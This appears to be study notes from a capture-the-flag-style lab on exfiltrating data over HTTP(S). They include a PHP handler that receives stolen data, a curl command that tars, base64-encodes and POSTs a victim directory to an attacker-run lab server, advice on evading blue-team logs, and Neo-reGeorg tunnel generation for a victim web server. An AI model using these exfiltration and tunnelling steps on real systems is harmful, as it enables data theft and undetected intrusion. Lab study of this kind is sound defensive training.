# Exfiltrate using HTTP(S)

Using the `HTTP/HTTPS` protocol to exfiltrate data from a victim to an attacker's machine requires an attacker 
to have control over a webserver with a server-side programming language installed and enabled. It is challenging 
to detect for the blue team if using the POST HTTP method in the data exfiltration (with the GET request, all 
parameters are registered into the log file).

* POST requests are never cached
* POST requests do not remain in the browser history
* POST requests cannot be bookmarked
* POST requests have no restrictions on data length

## HTTP data exfiltration

To exfiltrate data over the HTTP protocol:

* An attacker sets up a web server with a data handler (`web.thm.com` and a `contact.php` page as a data handler).
* A C2 agent or an attacker sends the data (using the `curl` command).
* The webserver receives the data and stores it (`contact.php` receives the POST request and stores it into `/tmp`).
* The attacker logs into the webserver to have a copy of the received data.

## Webserver

PHP snippet to handle POST requests via a file parameter and storing the received data in the `/tmp` directory as 
`http.bs64` file name:

```text
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

From the jumphost `ssh` into the `victim1.thm.com` machine with the given credentials:

    thm@jump-box:~$ ssh thm@victim1.thm.com

Check the data:

    thm@victim1:~$ ls -l

Send POST data via curl:

    thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php

From the victim1 or jump machine, log in to the webserver, `web.thm.com`, and check the `/tmp` directory:

    thm@victim1:~$ ssh thm@web.thm.com 
    thm@web:~$ ls -l /tmp/

Fix the broken `http.bs64` file (broken due to the URL encoding over HTTP). Using the sed command, replace the spaces 
with `+` characters to make it a valid `base64` string:

    thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64

Restore the data:

    thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -

## HTTPS communications

One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server. 
Apply the same technique as used for HTTP on a web server with SSL enabled, all transmitted data will be encrypted.  

## HTTP Tunneling

| ![HTTP tunnel](../../_static/images/http-tunnel.png) |
|:--:|
| With tunneling over the HTTP protocol technique other protocols are encapsulated and data can be sent <br>back and forth via the HTTP protocol. |

Use a `Neo-reGeorg` tool to create a communication channel to access the internal network devices:

Generate an encrypted client file to upload to the victim web server:

    root@kali:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm

The command generates encrypted tunneling clients with thm key in the `neoreg_servers/` directory. There are many 
extensions, including for PHP, ASPX, JSP, etc. 

Upload the `tunnel.php` file via the uploader machine. To access the uploader machine, visit 
`http://MACHINE_IP/uploader` or `https://LAB_WEB_URL.p.thmlabs.com/uploader` without the need for a VPN.